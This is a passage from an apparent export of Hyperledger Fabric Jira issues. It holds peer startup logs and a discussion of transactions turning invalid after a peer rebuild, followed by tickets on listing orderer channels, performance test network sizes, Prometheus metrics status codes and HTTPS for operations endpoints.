2020-05-06 15:51:00.730 UTC [couchdb] handleRequest -> WARN 005 Retrying couchdb request in 125ms. Attempt:1  Error:Get http://couchdbOrg1Peer0:5984/: dial tcp 172.21.0.9:5984: connect: connection refused
2020-05-06 15:51:00.859 UTC [couchdb] handleRequest -> WARN 006 Retrying couchdb request in 250ms. Attempt:2  Error:Get http://couchdbOrg1Peer0:5984/: dial tcp 172.21.0.9:5984: connect: connection refused
2020-05-06 15:51:01.111 UTC [couchdb] handleRequest -> WARN 007 Retrying couchdb request in 500ms. Attempt:3  Error:Get http://couchdbOrg1Peer0:5984/: dial tcp 172.21.0.9:5984: connect: connection refused
2020-05-06 15:51:01.614 UTC [couchdb] handleRequest -> WARN 008 Retrying couchdb request in 1s. Attempt:4  Error:Get http://couchdbOrg1Peer0:5984/: dial tcp 172.21.0.9:5984: connect: connection refused
2020-05-06 15:51:02.803 UTC [couchdb] CreateDatabaseIfNotExist -> INFO 009 Created state database _users
2020-05-06 15:51:02.849 UTC [couchdb] CreateDatabaseIfNotExist -> INFO 00a Created state database _replicator
2020-05-06 15:51:02.850 UTC [ledgermgmt] initialize -> INFO 00b ledger mgmt initialized
2020-05-06 15:51:02.850 UTC [peer] func1 -> INFO 00c Auto-detected peer address: 172.21.0.14:7051
2020-05-06 15:51:02.851 UTC [peer] func1 -> INFO 00d Returning peer0.org1.example.com:7051
2020-05-06 15:51:02.851 UTC [peer] func1 -> INFO 00e Auto-detected peer address: 172.21.0.14:7051
2020-05-06 15:51:02.851 UTC [peer] func1 -> INFO 00f Returning peer0.org1.example.com:7051
2020-05-06 15:51:02.853 UTC [nodeCmd] computeChaincodeEndpoint -> INFO 010 Entering computeChaincodeEndpoint with peerHostname: peer0.org1.example.com
2020-05-06 15:51:02.854 UTC [nodeCmd] computeChaincodeEndpoint -> INFO 011 Exit with ccEndpoint: peer0.org1.example.com:7052
2020-05-06 15:51:02.854 UTC [nodeCmd] createChaincodeServer -> WARN 012 peer.chaincodeListenAddress is not set, using peer0.org1.example.com:7052
2020-05-06 15:51:02.858 UTC [sccapi] registerSysCC -> INFO 013 system chaincode lscc(github.com/hyperledger/fabric/core/scc/lscc) registered
2020-05-06 15:51:02.858 UTC [sccapi] registerSysCC -> INFO 014 system chaincode cscc(github.com/hyperledger/fabric/core/scc/cscc) registered
2020-05-06 15:51:02.858 UTC [sccapi] registerSysCC -> INFO 015 system chaincode qscc(github.com/hyperledger/fabric/core/scc/qscc) registered
2020-05-06 15:51:02.858 UTC [sccapi] registerSysCC -> INFO 016 system chaincode (+lifecycle,github.com/hyperledger/fabric/core/chaincode/lifecycle,true) disabled
2020-05-06 15:51:02.862 UTC [gossip.service] func1 -> INFO 017 Initialize gossip with endpoint peer0.org1.example.com:7051 and bootstrap set [127.0.0.1:7051]
2020-05-06 15:51:02.867 UTC [gossip.gossip] NewGossipService -> INFO 018 Creating gossip service with self membership of Endpoint: , InternalEndpoint: peer0.org1.example.com:7051, PKI-ID: 3b47bbbd2b69d7ef9e04af52a09463a705f05de72ddcc656c31a8da2ccb2ae65, Metadata: 
2020-05-06 15:51:02.868 UTC [gossip.gossip] NewGossipService -> WARN 019 External endpoint is empty, peer will not be accessible outside of its organization
2020-05-06 15:51:02.868 UTC [gossip.gossip] start -> INFO 01a Gossip instance peer0.org1.example.com:7051 started
2020-05-06 15:51:02.869 UTC [sccapi] deploySysCC -> INFO 01b system chaincode lscc/(github.com/hyperledger/fabric/core/scc/lscc) deployed
2020-05-06 15:51:02.869 UTC [cscc] Init -> INFO 01c Init CSCC
2020-05-06 15:51:02.869 UTC [sccapi] deploySysCC -> INFO 01d system chaincode cscc/(github.com/hyperledger/fabric/core/scc/cscc) deployed
2020-05-06 15:51:02.869 UTC [qscc] Init -> INFO 01e Init QSCC
2020-05-06 15:51:02.869 UTC [sccapi] deploySysCC -> INFO 01f system chaincode qscc/(github.com/hyperledger/fabric/core/scc/qscc) deployed
2020-05-06 15:51:02.869 UTC [sccapi] deploySysCC -> INFO 020 system chaincode (+lifecycle,github.com/hyperledger/fabric/core/chaincode/lifecycle) disabled
2020-05-06 15:51:02.869 UTC [nodeCmd] serve -> INFO 021 Deployed system chaincodes
2020-05-06 15:51:02.871 UTC [discovery] NewService -> INFO 022 Created with config TLS: false, authCacheMaxSize: 1000, authCachePurgeRatio: 0.750000
2020-05-06 15:51:02.871 UTC [nodeCmd] registerDiscoveryService -> INFO 023 Discovery service activated
2020-05-06 15:51:02.871 UTC [nodeCmd] serve -> INFO 024 Starting peer with ID=[name:""peer0.org1.example.com"" ], network ID=[dev], address=[peer0.org1.example.com:7051]
2020-05-06 15:51:02.871 UTC [nodeCmd] serve -> INFO 025 Started peer with ID=[name:""peer0.org1.example.com"" ], network ID=[dev], address=[peer0.org1.example.com:7051]
2020-05-06 15:51:02.871 UTC [kvledger] LoadPreResetHeight -> INFO 026 Loading prereset height from path [/var/hyperledger/production/ledgersData/chains]
2020-05-06 15:51:02.871 UTC [fsblkstorage] LoadPreResetHeight -> INFO 027 Loading Pre-reset heights
2020-05-06 15:51:02.872 UTC [fsblkstorage] preRestHtFiles -> INFO 028 Dir [/var/hyperledger/production/ledgersData/chains/chains] missing... exiting
2020-05-06 15:51:02.872 UTC [fsblkstorage] LoadPreResetHeight -> INFO 029 Pre-reset heights loaded
2020-05-06 15:51:13.987 UTC [endorser] callChaincode -> INFO 02a [][a16d4e30] Entry chaincode: name:""cscc"" 
2020-05-06 15:51:13.988 UTC [endorser] callChaincode -> INFO 02b [][a16d4e30] Exit chaincode: name:""cscc""  (1ms)
2020-05-06 15:51:13.988 UTC [comm.grpc.server] 1 -> INFO 02c unary call completed grpc.service=protos.Endorser grpc.method=ProcessProposal grpc.peer_address=172.21.0.15:44656 grpc.code=OK grpc.call_duration=1.4193ms
2020-05-06 15:51:33.324 UTC [endorser] callChaincode -> INFO 02d [][7615ef6f] Entry chaincode: name:""cscc"" 
2020-05-06 15:51:33.325 UTC [ledgermgmt] CreateLedger -> INFO 02e Creating ledger [allarewelcome] with genesis block
2020-05-06 15:51:33.327 UTC [fsblkstorage] newBlockfileMgr -> INFO 02f Getting block information from block storage
2020-05-06 15:51:33.368 UTC [couchdb] CreateDatabaseIfNotExist -> INFO 030 Created state database allarewelcome_
2020-05-06 15:51:33.453 UTC [kvledger] CommitWithPvtData -> INFO 031 [allarewelcome] Committed block [0] with 1 transaction(s) in 84ms (state_validation=0ms block_and_pvtdata_commit=7ms state_commit=74ms) commitHash=[]
2020-05-06 15:51:33.457 UTC [ledgermgmt] CreateLedger -> INFO 032 Created ledger [allarewelcome] with genesis block
2020-05-06 15:51:33.471 UTC [gossip.gossip] JoinChan -> INFO 033 Joining gossip network of channel allarewelcome with 1 organizations
2020-05-06 15:51:33.471 UTC [gossip.gossip] learnAnchorPeers -> INFO 034 No configured anchor peers of Org1MSP for channel allarewelcome to learn about
2020-05-06 15:51:33.483 UTC [gossip.state] NewGossipStateProvider -> INFO 035 Updating metadata information for channel allarewelcome, current ledger sequence is at = 0, next expected block is = 1
2020-05-06 15:51:33.484 UTC [sccapi] deploySysCC -> INFO 036 system chaincode lscc/allarewelcome(github.com/hyperledger/fabric/core/scc/lscc) deployed
2020-05-06 15:51:33.485 UTC [cscc] Init -> INFO 037 Init CSCC
2020-05-06 15:51:33.485 UTC [sccapi] deploySysCC -> INFO 038 system chaincode cscc/allarewelcome(github.com/hyperledger/fabric/core/scc/cscc) deployed
2020-05-06 15:51:33.485 UTC [qscc] Init -> INFO 039 Init QSCC
2020-05-06 15:51:33.485 UTC [sccapi] deploySysCC -> INFO 03a system chaincode qscc/allarewelcome(github.com/hyperledger/fabric/core/scc/qscc) deployed
2020-05-06 15:51:33.485 UTC [sccapi] deploySysCC -> INFO 03b system chaincode (+lifecycle,github.com/hyperledger/fabric/core/chaincode/lifecycle) disabled
2020-05-06 15:51:33.485 UTC [endorser] callChaincode -> INFO 03c [][7615ef6f] Exit chaincode: name:""cscc""  (161ms)
2020-05-06 15:51:33.485 UTC [comm.grpc.server] 1 -> INFO 03d unary call completed grpc.service=protos.Endorser grpc.method=ProcessProposal grpc.peer_address=172.21.0.15:44658 grpc.code=OK grpc.call_duration=161.6937ms
2020-05-06 15:51:39.485 UTC [gossip.election] beLeader -> INFO 03e 3b47bbbd2b69d7ef9e04af52a09463a705f05de72ddcc656c31a8da2ccb2ae65 : Becoming a leader
2020-05-06 15:51:39.485 UTC [gossip.service] func1 -> INFO 03f Elected as a leader, starting delivery service for channel allarewelcome
2020-05-06 15:51:39.486 UTC [deliveryClient] StartDeliverForChannel -> INFO 040 This peer will retrieve blocks from ordering service and disseminate to other peers in the organization for channel allarewelcome
2020-05-06 15:51:39.490 UTC [deliveryClient] RequestBlocks -> INFO 041 Starting deliver with block [1] for channel allarewelcome
2020-05-06 15:51:39.503 UTC [gossip.privdata] StoreBlock -> INFO 042 [allarewelcome] Received block [1] from buffer
2020-05-06 15:51:39.540 UTC [couchdb] CreateDatabaseIfNotExist -> INFO 043 Created state database allarewelcome_lscc
2020-05-06 15:51:39.543 UTC [committer.txvalidator] Validate -> INFO 044 [allarewelcome] Validated block [1] in 40ms
2020-05-06 15:51:39.547 UTC [cceventmgmt] HandleStateUpdates -> INFO 045 Channel [allarewelcome]: Handling deploy or update of chaincode [ccForAll]
2020-05-06 15:51:39.551 UTC [ccprovider] ExtractStatedbArtifactsForChaincode -> INFO 046 Error while loading installation package for ccname=ccForAll, ccversion=1.0. Err=open /var/hyperledger/production/chaincodes/ccForAll.1.0: no such file or directory
2020-05-06 15:51:39.551 UTC [cceventmgmt] HandleChaincodeDeploy -> INFO 047 Channel [allarewelcome]: Chaincode [Name=ccForAll, Version=1.0, Hash=[]byte{0x58, 0xde, 0x21, 0xe4, 0x23, 0x9c, 0x80, 0x81, 0xda, 0x8, 0xf0, 0xdc, 0x64, 0xe0, 0xef, 0xab, 0xe9, 0x3d, 0x7a, 0x1a, 0x54, 0x6b, 0xa8, 0x38, 0xe2, 0xd8, 0x9f, 0x3c, 0x59, 0xc9, 0x23, 0x1c}] is not installed hence no need to create chaincode artifacts for endorsement
2020-05-06 15:51:39.606 UTC [couchdb] CreateDatabaseIfNotExist -> INFO 048 Created state database allarewelcome_cc$for$all
2020-05-06 15:51:39.635 UTC [kvledger] CommitWithPvtData -> INFO 049 [allarewelcome] Committed block [1] with 1 transaction(s) in 91ms (state_validation=13ms block_and_pvtdata_commit=4ms state_commit=71ms) commitHash=[244455f9439383ac0a929bf016883802da7643e650e7627a01dc156d11e56649]
2020-05-06 15:51:39.635 UTC [gossip.privdata] StoreBlock -> INFO 04a [allarewelcome] Received block [2] from buffer
2020-05-06 15:51:39.637 UTC [gossip.gossip] JoinChan -> INFO 04b Joining gossip network of channel allarewelcome with 1 organizations
2020-05-06 15:51:39.638 UTC [gossip.gossip] learnAnchorPeers -> INFO 04c Learning about the configured anchor peers of Org1MSP for channel allarewelcome : [{peer1.org1.example.com 7051}]
2020-05-06 15:51:39.638 UTC [committer.txvalidator] Validate -> INFO 04d [allarewelcome] Validated block [2] in 2ms
2020-05-06 15:51:39.673 UTC [kvledger] CommitWithPvtData -> INFO 04e [allarewelcome] Committed block [2] with 1 transaction(s) in 34ms (state_validation=0ms block_and_pvtdata_commit=7ms state_commit=24ms) commitHash=[455df3f5ca1462a0194834cf294078ea88ac251253dc1a366c4352f46754853f]
2020-05-06 15:51:39.674 UTC [gossip.privdata] StoreBlock -> INFO 04f [allarewelcome] Received block [3] from buffer
2020-05-06 15:51:39.680 UTC [committer.txvalidator] validateTx -> INFO 050 Find chaincode upgrade transaction for chaincode ccForAll on channel allarewelcome with new version 1.1
2020-05-06 15:51:39.680 UTC [committer.txvalidator] Validate -> INFO 051 [allarewelcome] Validated block [3] in 5ms
2020-05-06 15:51:39.683 UTC [cceventmgmt] HandleStateUpdates -> INFO 052 Channel [allarewelcome]: Handling deploy or update of chaincode [ccForAll]
2020-05-06 15:51:39.686 UTC [ccprovider] ExtractStatedbArtifactsForChaincode -> INFO 053 Error while loading installation package for ccname=ccForAll, ccversion=1.1. Err=open /var/hyperledger/production/chaincodes/ccForAll.1.1: no such file or directory
2020-05-06 15:51:39.686 UTC [cceventmgmt] HandleChaincodeDeploy -> INFO 054 Channel [allarewelcome]: Chaincode [Name=ccForAll, Version=1.1, Hash=[]byte{0x74, 0xef, 0x24, 0x4b, 0x4f, 0x1b, 0xd2, 0xbd, 0x23, 0x7f, 0x1e, 0x48, 0x33, 0x69, 0x8c, 0xfc, 0xa, 0xa3, 0xfb, 0x16, 0x4e, 0x2b, 0x88, 0xca, 0xfc, 0x84, 0xc2, 0x1a, 0xc2, 0xa2, 0x25, 0x88}] is not installed hence no need to create chaincode artifacts for endorsement
2020-05-06 15:51:39.732 UTC [kvledger] CommitWithPvtData -> INFO 055 [allarewelcome] Committed block [3] with 1 transaction(s) in 51ms (state_validation=15ms block_and_pvtdata_commit=6ms state_commit=27ms) commitHash=[d07ee45a070def67c28c26077caa70c571b59ad298fa09c318eea805321e3c77]
2020-05-06 15:51:39.732 UTC [gossip.privdata] StoreBlock -> INFO 056 [allarewelcome] Received block [4] from buffer
2020-05-06 15:51:39.733 UTC [cauthdsl] deduplicate -> WARN 057 De-duplicating identity [Org1MSP8664ada90efcda4d1aef62de4c834c7a3749ea2402bf069bc71304c89f61a800] at index 1 in signature set
2020-05-06 15:51:39.735 UTC [gossip.gossip] JoinChan -> INFO 058 Joining gossip network of channel allarewelcome with 2 organizations
2020-05-06 15:51:39.735 UTC [gossip.gossip] learnAnchorPeers -> INFO 059 No configured anchor peers of Org2MSP for channel allarewelcome to learn about
2020-05-06 15:51:39.735 UTC [gossip.gossip] learnAnchorPeers -> INFO 05a Learning about the configured anchor peers of Org1MSP for channel allarewelcome : [{peer1.org1.example.com 7051}]
2020-05-06 15:51:39.736 UTC [committer.txvalidator] Validate -> INFO 05b [allarewelcome] Validated block [4] in 3ms
2020-05-06 15:51:39.740 UTC [gossip.comm] func1 -> WARN 05c peer1.org1.example.com:7051, PKIid:dbabc5ef1a0ceb099052e7c31a96a9fb05ab6f0b8d9fe57601e79622eb18d5b0 isn't responsive: EOF
2020-05-06 15:51:39.740 UTC [gossip.discovery] expireDeadMembers -> WARN 05d Entering [dbabc5ef1a0ceb099052e7c31a96a9fb05ab6f0b8d9fe57601e79622eb18d5b0]
2020-05-06 15:51:39.741 UTC [gossip.discovery] expireDeadMembers -> WARN 05e Closing connection to Endpoint: , InternalEndpoint: peer1.org1.example.com:7051, PKI-ID: dbabc5ef1a0ceb099052e7c31a96a9fb05ab6f0b8d9fe57601e79622eb18d5b0, Metadata: 
2020-05-06 15:51:39.741 UTC [gossip.discovery] expireDeadMembers -> WARN 05f Exiting
2020-05-06 15:51:39.764 UTC [kvledger] CommitWithPvtData -> INFO 060 [allarewelcome] Committed block [4] with 1 transaction(s) in 28ms (state_validation=0ms block_and_pvtdata_commit=7ms state_commit=18ms) commitHash=[b89e4b6e0d72c6265021ec25e7f61e47c8d9a29843079f54d905127ec025f91b]
2020-05-06 15:51:42.706 UTC [comm.grpc.server] 1 -> INFO 061 unary call completed grpc.service=gossip.Gossip grpc.method=Ping grpc.request_deadline=2020-05-06T15:51:44.706Z grpc.peer_address=172.21.0.12:43494 grpc.code=OK grpc.call_duration=70.4µs
2020-05-06 15:51:48.438 UTC [gossip.channel] reportMembershipChanges -> INFO 062 Membership view has changed. peers went online:  [[ peer1.org1.example.com:7051]] , current view:  [[ peer1.org1.example.com:7051]]
2020-05-06 15:51:49.475 UTC [gossip.election] stopBeingLeader -> INFO 063 3b47bbbd2b69d7ef9e04af52a09463a705f05de72ddcc656c31a8da2ccb2ae65 Stopped being a leader
2020-05-06 15:51:49.475 UTC [gossip.service] func1 -> INFO 064 Renounced leadership, stopping delivery service for channel allarewelcome
2020-05-06 15:51:49.476 UTC [deliveryClient] try -> WARN 065 Got error: rpc error: code = Unavailable desc = transport is closing , at 1 attempt. Retrying in 1s
2020-05-06 15:51:49.476 UTC [blocksProvider] DeliverBlocks -> WARN 066 [allarewelcome] Receive error: client is closing
2020-05-06 15:51:53.437 UTC [gossip.channel] reportMembershipChanges -> INFO 067 Membership view has changed. peers went online:  [[ peer2.org1.example.com:7051]] , current view:  [[ peer1.org1.example.com:7051] [ peer2.org1.example.com:7051]]
{code}
 ;;;","25/Jun/20 7:48 PM;denyeart;[~KoushKilla] Are you still seeing the problem? What I meant in my prior request, was please attach both logs, one log showing valid status, and one log showing invalid status. The single log above does not show any invalidations.;;;","26/Jun/20 5:37 AM;KoushKilla;HI David, 

Thanks for the response. Here is the transaction validation code for the block number #3, it changes from valid to invalid once I disable disk mounting and rebuild the container hence the peer gets kicked out of the channel. I fetch the block again after I rejoin the channel, and as shown below block #3 now states that it is invalid. 

 

~```shell~

Current hash: aa3778ca0cb72396f258b94348994ccfb607ac7888e7b98d5a43895866105258

Previous hash: b13842990bd59ffffc82a6fa3a0f69575b026b25b4cc4c2ffee65a4565a02a54

Transaction 0 status: VALID

~```~

```shell

Current hash: aa3778ca0cb72396f258b94348994ccfb607ac7888e7b98d5a43895866105258

Previous hash: b13842990bd59ffffc82a6fa3a0f69575b026b25b4cc4c2ffee65a4565a02a54

Transaction 0 status: ENDORSEMENT_POLICY_FAILURE 

```

 ;;;","19/Nov/20 12:03 AM;manish-sethi;[~KoushKilla] - From whatever you have mentioned, it appears to me that when you rebuild the peer, you did not explicitly dropped the couchdb. As a result, you may have been rebuilding the peer with existing couchdb (that is already populated by the previous peer). In this situation, what you are observing is expected. Specially, for the chaincode upgrade transaction in block-3, that your logs show. 

Anyhow, I have opened a Jira (FAB-18347) to add this check at the peer start.

However, if this is not the case, we will need the logs from the peer where the unexpectedly transactions are being marked as invalid.;;;","20/Nov/20 9:22 PM;ddhulla;Hi Manish,

Thank you for the response. Not sure whether the couchdb was dropped during the rebuild activity. We will redo the steps and check whether the issue reproduced when the couchdb is dropped before the rebuild. Will share the update and logs if it reproduces.

Thanks.;;;","23/Nov/20 11:18 PM;manish-sethi;[~ddhulla] - Thanks. Closing this for now and please feel free to open again if you get more info that indicates that this is a real issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow the orderer to List channels,FAB-17824,44978,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,30/Apr/20 5:36 PM,03/Jun/20 3:12 AM,28/Oct/23 3:10 AM,03/Jun/20 3:12 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"# Allow the orderer to list all the channels it is a member in or a follower to. The list includes summary information only, and identifies the system channel if it  exists.
 # Allow the orderer to provide a extended information on the status of a specific channel.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i01bkz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"For Performance Regression - Come up with t-shirt sizing networks (small, medium, large) as representative networks to test Performance Regression.",FAB-17825,44982,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,robmurgai,robmurgai,01/May/20 3:18 AM,11/Jan/21 3:06 AM,28/Oct/23 3:10 AM,11/Jan/21 3:06 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"In order to run performance regression, we need to have some representative networks for Fabric.  Not sure if these already exists, but if not, it would be nice to start with three network setups:

 

Small:  maybe like the one in Fab-17614, 
 * 2 orgs
 * 2 peers with CA's
 * 2 orderer nodes
 * 1 channel
 * 1 chaincode types

Medium: 
 * 5 orgs
 * 2 peers with CA's
 * 5 orderer nodes all belonging to the same org.
 * 5 channel
 * 1 chaincode types

 Large:
 * 30 orgs
 * 2 peers with CA's
 * 10 orderer nodes, from different Orgs
 * 1 channel
 * 1 chaincode types

 ",,robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicate metrics with different status codes generated,FAB-17826,44983,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,SharedMocha,SharedMocha,01/May/20 9:24 AM,04/May/20 4:54 AM,28/Oct/23 3:10 AM,04/May/20 4:54 AM,,,,,,,,,,,,,,,,,,,,,,,0,Operating,Serviceability,,,,"HI - I am extracting metrics from peer using Prometheus and I notice that certain metrics are repeating as below. While the CouchDB and Peer is up and running I am not quite sure why I see 404 in the metrics and 200 for the same function and type.

This happens for metrics - 

Example 1 - (Truncated other items)
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.005""} 2|

|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.005""} 1|

Example 2 - (Truncated other items)
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""GetDatabaseInfo"",result=""200"",le=""0.005""} 0|

|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""GetDatabaseInfo"",result=""404"",le=""0.005""} 0|

 

Example 3 - (Truncated other items)
|endorser_proposal_duration_bucket\{chaincode=""lscc:"",channel="""",success=""false"",le=""0.005""} 0|

|endorser_proposal_duration_bucket\{chaincode=""lscc:"",channel="""",success=""true"",le=""0.005""} 0|

 

Example 4 - (Truncated other items)
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""GetDatabaseInfo"",result=""200"",le=""0.005""} 0|

|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""GetDatabaseInfo"",result=""404"",le=""0.005""} 0|

 

Example 5 - Expanded
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.005""} 2| |
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.01""} 7|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.025""} 23|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.05""} 30|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.1""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.25""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""0.5""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""1""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""2.5""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""5""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""10""} 34|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""200"",le=""+Inf""} 34|
|couchdb_processing_time_sum\{database=""mychannel_"",function_name=""ReadDoc"",result=""200""} 0.7605876999999999|
|couchdb_processing_time_count\{database=""mychannel_"",function_name=""ReadDoc"",result=""200""} 34|
| | |
| | |
| | |
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.005""} 1| |
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.01""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.025""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.05""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.1""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.25""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""0.5""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""1""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""2.5""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""5""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""10""} 1|
|couchdb_processing_time_bucket\{database=""mychannel_"",function_name=""ReadDoc"",result=""404"",le=""+Inf""} 1|
|couchdb_processing_time_sum\{database=""mychannel_"",function_name=""ReadDoc"",result=""404""} 0.0027322|
|couchdb_processing_time_count\{database=""mychannel_"",function_name=""ReadDoc"",result=""404""} 1|",,denyeart,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/May/20 9:24 AM;SharedMocha;metrics_orderer.txt;https://jira.hyperledger.org/secure/attachment/18317/metrics_orderer.txt","01/May/20 9:24 AM;SharedMocha;metrics_peer.txt;https://jira.hyperledger.org/secure/attachment/18316/metrics_peer.txt",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bln:",,,,Unset,Unset,,"Setup fabric cluster with Prometheus as reporting as per this doc for one peer-https://hyperledger-fabric.readthedocs.io/en/release-2.0/operations_service.html

Now, go to  your URL/metrics and notice above issue from any peer",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/May/20 4:53 AM;denyeart;200 and 404 are both acceptable and expected return codes. The metrics are simply telling you how many occurrences there were for each return code.
CouchDB returns 404 if it tries to query a document and the document is not yet created in the database.
The peer handles the 404 correctly depending on the scenario (e.g. it would return nil on a GetState() call).
I'll close as working as expected.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Provide a way to include https for operating service and prometheus endpoints when running network as docker containers,FAB-17827,44984,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,SharedMocha,SharedMocha,01/May/20 9:38 AM,06/May/20 8:19 AM,28/Oct/23 3:10 AM,06/May/20 8:18 AM,,,,,,,,,,,,,,,,,,,,,,,0,OPERATING,prometheus,Serviceability,ssl,,"As a user when running an entire network in docker containers - I specify Prometheus and operating service values as environment variables in the docker-compose file of the peer and orderer. (Sample added to the bottom) and it works perfectly but these are not secure URLs(https).

Ex- 

Peer
- CORE_METRICS_PROVIDER=prometheus
- CORE_OPERATIONS_LISTENADDRESS=peer0.org1.example.com:1443
 
Orderer
- ORDERER_METRICS_PROVIDER=prometheus
- ORDERER_OPERATIONS_LISTENADDRESS=orderer0.example.com:4443
 
CA
- FABRIC_CA_SERVER_CA_NAME=ca.example.com
- FABRIC_CA_SERVER_METRICS_PROVIDER=prometheus
-------------------------------------------------------------------------------------------
 
It would help if we can pass values to make these endpoints use existing TLS certs whrn running from docker container-
[https://peer0.org1.example.com:1443/metrics] or
[https://host:1443/mhealthz|https://peer0.org1.example.com:1443/metrics]
 
Something like below - Peer
- CORE_METRICS_OPERATIONS_HTTPS_ENABLED=true
 
Orderer
- ORDERER_METRICS_OPERATIONS_HTTPS_ENABLED=true
 
CA
- FABRIC_CA_SERVER_OPERATIONS_HTTPS_ENABLED=true
 
-------------Orderer-compose.yaml---------------------------------------------------------
orderer0.example.com:
extends:
file: docker-compose-base.yml
service: orderer
container_name: orderer0.example.com
environment:
- ORDERER_HOST=orderer0.example.com
- CONFIGTX_ORDERER_ORDERERTYPE=kafka
- CONFIGTX_ORDERER_KAFKA_BROKERS=[kafka0:9092,kafka1:9092,kafka2:9092,kafka3:9092]
- ORDERER_KAFKA_RETRY_SHORTINTERVAL=1s
- ORDERER_KAFKA_RETRY_SHORTTOTAL=30s
- ORDERER_KAFKA_VERBOSE=true
- ORDERER_GENERAL_GENESISPROFILE=SampleInsecureKafka
- ORDERER_ABSOLUTEMAXBYTES=${ORDERER_ABSOLUTEMAXBYTES}
- ORDERER_PREFERREDMAXBYTES=${ORDERER_PREFERREDMAXBYTES}
- ORDERER_METRICS_PROVIDER=prometheus
- ORDERER_OPERATIONS_LISTENADDRESS=orderer0.example.com:4443
- ORDERER_GENERAL_TLS_ENABLED=true
- ORDERER_GENERAL_TLS_PRIVATEKEY=/var/hyperledger/tls/server.key
- ORDERER_GENERAL_TLS_CERTIFICATE=/var/hyperledger/tls/server.crt
- ORDERER_GENERAL_TLS_ROOTCAS=/var/hyperledger/tls/ca.crt
